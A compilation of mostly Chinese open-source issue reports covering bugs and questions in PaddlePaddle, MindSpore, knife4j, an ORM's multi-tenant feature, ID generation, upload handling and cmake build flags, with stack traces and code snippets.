selectByExample条件查询返回list问题反馈,"selectByExample条件查询返回list，如果设置selectProperties选定查询1列，而刚好这一列没有值（null）时，list里面的泛型类型实参model就会是null，而不是一个不为null的model实例（只是这一列的属性值为null而已），我觉得这样是不合理的。 比如： User表（对应Model为User） id gender birth email 1 张三 男 2000-11-11 zhangsan@test.com 2 李四 女 2001-12-12 那么查询时，example.selectProperties(""email"")，查询返回的结果集List中id为2的那一行数据会是null，即：   <code>: [{""email"": ""zhangsan@test.com""}, null]"
[ST][MS/modelzoo][NET][facedetection] train fail ,"modelzoo/facedetection 脚本修改导致训练失败 / 硬件环境: /device Ascend/ : -- MindSpore version :master commit_id:cc5359cb -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_model_zoo_facedetection_check_loss_8p get code from models sh run_distribute_train_gpu.sh 训练成功 走给cath wong   <code>: Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/engine/datasets.py"", line 2762, in _pyfunc_worker_exec r = _GLOBAL_PYFUNC_LIST[index](*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/transforms/py_transforms_util.py"", line 198, in __call__ result.reraise() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/core/py_util_helpers.py"", line 62, in reraise raise self.except_type(err_msg) NameError: Caught NameError in map(or batch) worker and execute python function. Original Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/transforms/py_transforms_util.py"", line 195, in __call__ result = self.transform(*args) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/Model_zoo_facedetection_yolov3/Test_ms_model_zoo_facedetection_check_loss_8p/src/data_preprocess.py"", line 207, in preprocess_fn decode = P.Decode(True) NameError: name 'P' is not defined"
TypeError: __init__() got an unexpected keyword argument 'error_clipping_threshold' in fc_layer,"paddlepaddle版本v0.10.0（大概10月份的docker镜像） mixed_layer 可以正常使用error_clipping_threshold， 在fc_layer就会报如下错误： 我的使用方式：   <code>: I1207 07:43:08.559044 35 Util.cpp:166] commandline: --log_error_clipping=True --use_gpu=False --trainer_count=1 Traceback (most recent call last): File ""start_trainer.py"", line 678, in &lt;module&gt; main(args) File ""start_trainer.py"", line 604, in main gradient_clipping_threshold=args.gradient_clipping_threshold) File ""/usr/local/lib/python2.7/dist-packages/Newbie-0.0.1-py2.7.egg/newbie/model/anomaly_detection/lstm_model.py"", line 137, in __init__ self.__lstm_network() File ""/usr/local/lib/python2.7/dist-packages/Newbie-0.0.1-py2.7.egg/newbie/model/anomaly_detection/lstm_model.py"", line 229, in __lstm_network self.__parameters = paddle.parameters.create(cost) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/parameters.py"", line 19, in create topology = Topology(layers) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/topology.py"", line 69, in __init__ layers, extra_layers=extra_layers) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/layer.py"", line 96, in parse_network return __parse__(__real_func__) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/config_parser_utils.py"", line 32, in parse_network_config config = config_parser.parse_config(network_conf, config_arg_str) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer/config_parser.py"", line 3597, in parse_config trainer_config() File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/layer.py"", line 89, in __real_func__ real_output = [each.to_proto(context=context) for each in output_layers] File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 109, in to_proto context=context) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 116, in to_proto ret_val = self.to_proto_impl(**kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 212, in to_proto_impl return getattr(conf_helps, method_name)(**args) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/layers.py"", line 329, in wrapper return method(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/layers.py"", line 938, in fc_layer **ExtraLayerAttribute.to_kwargs(layer_attr)) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer/config_parser.py"", line 3180, in Layer return layer_func(name, **xargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer/config_parser.py"", line 1592, in __init__ super(FCLayer, self).__init__(name, 'fc', size, inputs=inputs, **xargs) TypeError: __init__() got an unexpected keyword argument 'error_clipping_threshold' fc_attr = paddle.attr.ExtraAttr(error_clipping_threshold=self.__error_clipping_threshold， drop_rate=self.__drop_rate) fc_0 = paddle.layer.fc(input=X, size=self.__hidden_dim, act=paddle.activation.Linear(), param_attr=fc_para_attr_first, layer_attr=fc_attr)"
动态图 BatchNorm 中 bias_attr 指定有误,"错误位置： https://github.com/PaddlePaddle/Paddle/blob/9bd44b94da0d82a25d1810b48997d1c6170514aa/python/paddle/fluid/dygraph/nn.py#L1055 https://github.com/PaddlePaddle/Paddle/blob/9bd44b94da0d82a25d1810b48997d1c6170514aa/python/paddle/fluid/dygraph/nn.py#L1077 应为：   <code>: self._bias_attr = bias_attr attr=self._bias_attr,"
[bug] 关于 validateExtUrl 取值 bug,"当然多个swagger_resources时，extBasePath 只会取第一个swagger_resource作为校验地址。导致其他swagger_resource无法配置增强。   <code>: var extBasePath=""""; var idx=newUrl.indexOf(""/v2/api-docs""); if(idx&gt;0){ //增强地址存在basePath extBasePath=newUrl.substr(0,idx); } that.log(""增强basePath地址：""+extBasePath); //赋值增强地址 g.extUrl=extBasePath+that.extUrl+""?group=""+group.name; if(that.validateExtUrl==""""){ that.validateExtUrl=g.extUrl; } //如果开启SwawggerBootstrapUi增强,则判断当前后端是否启用注解 if(enableSbuFlag){ var api=that.validateExtUrl; var idx=api.indexOf(""/""); if(idx==0){ api=api.substr(1); } ... }"
感谢作者开源的这款产品！,很早就关注过hutool，公司的项目也正在被我集成hutool工具包，很不错的一款开发工具包。 在我的开源项目JustAuth中就用到了hutool的模块。 之前都是用的hutool4.1.21版本，最近会发布1.8.0版本，hutool会升级到4.5.15 感兴趣的朋友可以关注一下。   <code>: hutool-http JustAuth v1.7.1
TargetAdditional的有效作用范围问题,"目前在尝试架构多租户，使用TargetAdditional，发现TargetAdditional在一些场景不生效。 环境代码： 执行正常： 执行报错： 另外，我认为多租户的实现，优于，只需要扩展NameConversion支持TargetAdditional扩展就可以达到效果，不需要再定义toTable方法，还要设置虚拟表。   <code>: @Tenant public static class TenantUser { } @SqlResource(""tenant"") public interface TenantUserMapper extends BaseMapper&lt;TenantUser&gt; { public LambdaQuery&lt;TenantUser&gt; getTenantUser(); } tenant.md getTenantUser === SELECT * FROM tenantUser where tenantId=#{tenantId} String sql = ""SELECT * FROM tenantUser where tenantId=#{tenantId}""; List&lt;TenantUser&gt; data = sqlManager.execute(sql, TenantUser.class, new HashMap()); SqlId sqlId = SqlId.of(""tenant"", ""getTenantUser""); sqlManager.select(sqlId, TenantUser.class); 变量未定义(VAR_NOT_DEFINFD) SqlId sqlId = SqlId.of(""tenant"", ""getTenantUser""); PageResult&lt;TenantUser&gt; pageResult = sqlManager.pageQuery(sqlId, TenantUser.class, new HashMap(), DefaultPageRequest.of(1, 10)); LambdaQuery&lt;TenantUser&gt; query = tenantUserMapper.getTenantUser(); query.select(); @Table(name = ""${schema}.tenantUser"") @Table(name = ""${toTable('sys_user')}"")"
菜单联动问题,"在首页点击按钮，进入新的页面，菜单无联动，标签栏无新增，该怎么写才会达到联动效果   <code>: function stuInf(){ window.location.href=""/qyz/studentNew/stuIof/2399""; /*$.modal.openTab(""个人信息"", prefix + ""/stuIof/"" + 2399);*/ }"
多级联动第一次调用数据的时候很卡,"const/crud/a.js 级联代码如上，根据类型选择不同状态，在点击查看或者编辑按钮弹框的时候会， 调用接口common/getStatus去获取状态数据，这个时候界面会有3-5秒的卡顿。 查看和编辑 都是用的默认 this.$refs.crud.rowView(row, index); this.$refs.crud.rowEdit(row, index); 以下是谷歌请求截图 请教大神这是什么情况，/common/getStatus 这个接口在弹窗的时候调用了104次...   <code>: export const tableOption = { props: { label: 'name', value: 'code' }, column: [ { label: '类型', prop: 'types', type: 'select', solt: true, sortable: true, addVisdiplay: false, editVisdiplay: false, cascader: ['status'], cascaderFirst: true, dicUrl: `/common/getType`, dicData:'types' }, { label: '状态', prop: 'status', type: 'select', solt: true, sortable: true, addVisdiplay: false, editVisdiplay: false, dicUrl: `/common/getStatus/{{key}}`, dicData:'status' }, ] }"
2.0.1版本启动失败报springfox.documentation.spring.web.plugins.DocumentationPluginsManager.createContextBuilder,"POM文件引用方法是 com.github.xiaoymin knife4j-spring-boot-starter 2.0.1 报错信息为： 2020-02-04 01:50:50.430 INFO 11632 --- [ restartedMain] c.m.m.c.config.SwaggerConfiguration : 是否开启swagger：true 2020-02-04 01:50:50.802 INFO 11632 --- [ restartedMain] o.s.s.concurrent.ThreadPoolTaskExecutor : Initializing ExecutorService 'applicationTaskExecutor' 2020-02-04 01:50:50.859 INFO 11632 --- [ restartedMain] o.s.b.d.a.OptionalLiveReloadServer : LiveReload server is running on port 35729 2020-02-04 01:50:51.686 INFO 11632 --- [ restartedMain] o.s.s.c.ThreadPoolTaskScheduler : Initializing ExecutorService 'taskScheduler' 2020-02-04 01:50:51.938 INFO 11632 --- [ restartedMain] d.s.w.p.DocumentationPluginsBootstrapper : Context refreshed 2020-02-04 01:50:51.983 INFO 11632 --- [ restartedMain] d.s.w.p.DocumentationPluginsBootstrapper : Found 1 custom documentation plugin(s) 2020-02-04 01:50:51.989 WARN 11632 --- [ restartedMain] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.context.ApplicationContextException: Failed to start bean 'documentationPluginsBootstrapper'; nested exception is java.lang.NoSuchMethodError: org.springframework.plugin.core.PluginRegistry.getPluginFor(Ljava/lang/Object;Lorg/springframework/plugin/core/Plugin;)Lorg/springframework/plugin/core/Plugin; 2020-02-04 01:50:51.990 INFO 11632 --- [ restartedMain] o.s.s.c.ThreadPoolTaskScheduler : Shutting down ExecutorService 'taskScheduler' 2020-02-04 01:50:51.990 INFO 11632 --- [ restartedMain] o.s.s.concurrent.ThreadPoolTaskExecutor : Shutting down ExecutorService 'applicationTaskExecutor' 2020-02-04 01:50:51.999 INFO 11632 --- [ restartedMain] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default' 2020-02-04 01:50:52.004 INFO 11632 --- [ restartedMain] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closing ... 2020-02-04 01:50:52.008 INFO 11632 --- [ restartedMain] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closed 2020-02-04 01:50:52.012 INFO 11632 --- [ restartedMain] o.apache.catalina.core.StandardService : Stopping service [Tomcat] 2020-02-04 01:50:52.028 INFO 11632 --- [ restartedMain] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-02-04 01:50:52.032 ERROR 11632 --- [ restartedMain] o.s.b.d.LoggingFailureAnalysisReporter : APPLICATION FAILED TO START Description: An attempt was made to call a method that does not exist. The attempt was made from the following location: The following method did not exist: The method's class, org.springframework.plugin.core.PluginRegistry, is available from the following locations: It was loaded from the following location: Action: Correct the classpath of your application so that it contains a single, compatible version of org.springframework.plugin.core.PluginRegistry 请大侠指点一点。   <code>: springfox.documentation.spring.web.plugins.DocumentationPluginsManager.createContextBuilder(DocumentationPluginsManager.java:152) org.springframework.plugin.core.PluginRegistry.getPluginFor(Ljava/lang/Object;Lorg/springframework/plugin/core/Plugin;)Lorg/springframework/plugin/core/Plugin; jar:file:/C:/Users/toby/.m2/repository/org/springframework/plugin/spring-plugin-core/2.0.0.RELEASE/spring-plugin-core-2.0.0.RELEASE.jar!/org/springframework/plugin/core/PluginRegistry.class file:/C:/Users/toby/.m2/repository/org/springframework/plugin/spring-plugin-core/2.0.0.RELEASE/spring-plugin-core-2.0.0.RELEASE.jar"
order by 的字段自动转下划线驼峰命名导致自建表无法排序,"如果mysql表中有字段是符合驼峰命名的，那么在对该字段进行排序的时候，PageDomain::getOrderBy会将该字段转成下划线分段的，例如UserID会转成user_id，实际数据库中确实是UserID，从而导致无法对该字段进行排序； 如果去掉转换，系统内的自带功能则会被破坏； 能否添加一个注解，类似，可以选择让某个函数或者某个BaseController的继承的order by字段不进行转换 或者给BaseController添加一个属性，可以控制是否进行转换。   <code>: public String getOrderBy() { if (StringUtils.isEmpty(orderByColumn)) { return """"; } return StringUtils.toUnderScoreCase(orderByColumn) + "" "" + isAsc; } @DataSource"
Add target_link_libraries for cc_library,"It will fix #2728:Don't merge!!Just test teamcity!. Maybe it is silly to for static library, because a static library do not need to link other libraries. But it will tell cmake how to propagate dependencies. The solution comes from here.   <code>: target_link_libraries"
IR Mutator and Pattern matcher,"RFC Add a recursive IR Mutator (optionally mutable or immutable) with a pattern matcher to find/replace node(s). kind/feature Currently, the optimizers are applied using queues for todo &amp; visited nodes inside a while loop ( function in ). To build a new optimizer the developer must create a new class inheriting from and individually check node by node if they match certain criteria in order to be replaced by the desired result. There are actually two steps, the first one is using the function, which verifies if the corresponds to a specific Primitive and if the nodes are compatible with some specified functions. The second step is within the overridden function, which is triggered by , where the developer writes the code to detect if the node should be replaced or not. Currently, this mechanism requires storing nodes in auxiliary variables that later will be checked to confirm the match. A simple scenario is shown in the image below ( class in ) Notes: To allow for cycles or ""diamond shapes"" in the graph, there's a map of node-&gt;mutated_node that blocks the recursion in case the node has already been mutated. To ease the migration or the parallel use of AnfMutator with the existing code, there's also a function that works recursively and calls the Mutate function when there's a match. The Patter Matcher As discussed in ... Trail No. Task Description Related Issue(URL) 1 2   <code>: ApplyTransform opt.cc AnfVisitor Match CNode Visit Match AddByZero arithmetic_simplify.cc Match Visit operator() AnfMutator AnfMutator Match"
【BUG】集群部署下多个节点可能产生相同的ID,"IdGen中的 其中workerId和datacenterID不应为静态   <code>: IdWorker idWorker = new IdWorker(-1, -1);"
是否兼容Tomcat9， JDK1.8,"在Tomcat9和JDK8环境下，运行始终报错 麻烦作者指教一下如何修改，谢谢！   <code>: 10-Oct-2017 20:16:50.334 严重 [ajp-nio-8009-exec-21] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/pages] threw exception [Unable to compile class for JSP: An error occurred at line: [14] in the generated java file: [C:\Tomcat\work\Catalina\jsherp\pages\org\apache\jsp\common\main_jsp.java] Only a type can be imported. com.jsh.util.Tools resolves to a package An error occurred at line: [6] in the jsp file: [/common/main.jsp] Tools cannot be resolved 3: &lt;% 4: String path = request.getContextPath(); 5: String basePath = request.getScheme()+""://""+request.getServerName()+"":""+request.getServerPort()+path+""/""; 6: String clientIp = Tools.getLocalIp(request); 7: %&gt; 8: &lt;!DOCTYPE html&gt; 9: &lt;html&gt;"
Discuz! X 官方 Git 编码转换工具 bug,Git\lib_Convert.cmd Git\Run.cmd 两个批处理有错误，导致转码失败，希望官方修复   <code>: ..\..\lib\convert\convert /q /i:%1 /o:%2 /f:%4 %%i\*.* @echo ·转换编码 call ..\lib\_Convert.cmd UTF8 GBK SC_GBK D call ..\lib\_Convert.cmd UTF8 UTF8 TC_UTF8 T xcopy /y/e dir_SC_UTF8\upload\api\addons dir_SC_GBK\upload\api\addons &gt;&gt;log xcopy /y/e dir_SC_UTF8\upload\api\addons dir_TC_UTF8\upload\api\addons &gt;&gt;log xcopy /y/e dir_SC_UTF8\upload\template\default\m dir_SC_GBK\upload\template\default\m &gt;&gt;log xcopy /y/e dir_SC_UTF8\upload\template\default\m dir_TC_UTF8\upload\template\default\m &gt;&gt;log xcopy /y/e ..\lib\image_big5 dir_TC_UTF8\upload\static\image &gt;&gt;log ..\lib\php\php ..\lib\php\setvt.php
多个元素一样的上传问题,"那么问题来了，请问我如何在data提交id参数值便于服务器端区分，id = $("".input-file"").attr('id');这样肯定是不行，获取到的肯定是第一个input 的ID值image1，显然image2和image3的上传都没办法了， 我真的是被逼疯了，想通过change的变动触发后再执行upload.render，可问题是放在函数里就死了没反应！！！ 应该在done上传提交参数的时候整一个获取当前提交元素的值，不然都不能用上传   <code>: &lt;input type=""file"" class=""input-file"" name=""image1"" id=""image1""/&gt; &lt;input type=""file"" class=""input-file"" name=""image2"" id=""image2""/&gt; &lt;input type=""file"" class=""input-file"" name=""image3"" id=""image3""/&gt; var id = $("".input-file"").attr('id'); var uploadInst = upload.render({ elem: '.input-file' //这样绑定元素 ,url: url //上传接口 ,data: {id: id} ,done: function(res){"
【众智】【计算-AICPU开发】EuclideanNorm,EuclideanNorm 计算euclidean norm keep_dims Bool 属性 x axes y 对应底层算子 对应底层AICPU算子EuclideanNorm Classify Name Type Type Range Required Format INPUT x NumberType TRUE INPUT axes IndexNumberType TRUE OUTPUT y NumberType TRUE ATTR keep_dims Bool FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/EuclideanNorm 3. 异常处理 4. 算子反向 参考Tensorflow算子反向实现_EuclideanNormGrad。 目录：tensorflow\tensorflow\python\ops\math_grad.py   <code>: class EuclideanNorm(Primitive):
[CT][MS][CI]Fatal Python error: Bus error,": /device ascend + pynative /device gpu + pynative : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_highgrad_control.py test_highgrad_operations.py test_highgrad_layernorm.py --gpu pytest -sqv test_highgrad_control.py Describe heading texthe current behavior pass   <code>: ../high_grad/test_highgrad_control.py::test_highgrad_control_if_mul PASSED [ 20%] ../high_grad/test_highgrad_control.py::test_highgrad_control_while Fatal Python error: Bus error Thread 0x0000ffff5af4b160 (most recent call first): File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 300 in wait File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 552 in wait File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 1175 in run File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 926 in _bootstrap_inner File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 890 in _bootstrap Current thread 0x0000ffff9a02a010 (most recent call first): File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 359 in end_graph File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 372 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 354 in _pynative_forward_run File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 373 in after_grad File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 75 in wrapper File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/share/grad.py"", line 27 in construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 326 in run_construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 368 in __call__ File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/share/grad.py"", line 85 in construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 326 in run_construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 368 in __call__ File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/high_grad/test_highgrad_control.py"", line 45 in forward_mindspore_impl File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/high_grad/test_highgrad_control.py"", line 63 in forward_cmp File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/high_grad/test_highgrad_control.py"", line 109 in test_highgrad_control_while File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/archiconda3/envs/vm3.7/bin/pytest"", line 10 in &lt;module&gt;"
MindSpore 1.8.0 导出 air 报错,"导出air时报错TypeError: Object of type 'NoneType' is not an instance of 'function'。具体版本信息已在下面列出。 / 硬件环境: /device ascend : -- MindSpore version : 1.8.0 master_20220612181547 -- CANN version：5.1.RC2.B030 -- Python version : 3.9.2 -- OS platform and distribution : Linux arm -- GCC/Compiler version : (/): /mode graph   <code>: Traceback (most recent call last): File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/inside_train.py"", line 190, in main train_with_args(args_opt) File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/inside_train.py"", line 230, in train_with_args air_file = trans_ckpt_to_air(args_opt, device_id) File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/model_wrapper/train_utils.py"", line 38, in trans_ckpt_to_air export_main(device_id=device_id, File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/model_wrapper/export_wrapper.py"", line 46, in export_main export(net, img, file_name=air_file, file_format=args.file_format) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/train/serialization.py"", line 907, in export _export(net, file_name, file_format, *inputs, **kwargs) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/train/serialization.py"", line 930, in _export _save_air(net, file_name, *inputs, **kwargs) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/train/serialization.py"", line 973, in _save_air _executor.export(file_name, graph_id) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/common/api.py"", line 1226, in export export_graph(file_name, 'AIR', graph_id, encrypt_func, enc_key) TypeError: Object of type 'NoneType' is not an instance of 'function'"
Change Paddle RelWithDebInfo Flags,"We need set 's C/CXX flags from to , since we always use in the production environment.   <code>: RelWithDebInfo -O2 -g -O3 -g -O3"
cmake 如何指定-O2,cmake 如何指定-O2 目前我是这样编译的   <code>: cmake -DCMAKE_INSTALL_PREFIX=./output/ -DCMAKE_BUILD_TYPE=Release -DWITH_PYTHON=ON -DWITH_MKL=OFF -DWITH_GPU=OFF -DWITH_FLUID_ONLY=ON -DPYTHON_INCLUDE_DIR=$PYTHONROOT/include/python2.7/ -DPYTHON_LIBRARY=$PYTHONROOT/lib/libpython2.7.so -DPYTHON_EXECUTABLE=$PYTHONROOT/bin/python2.7 -DWITH_PSLIB=ON ..
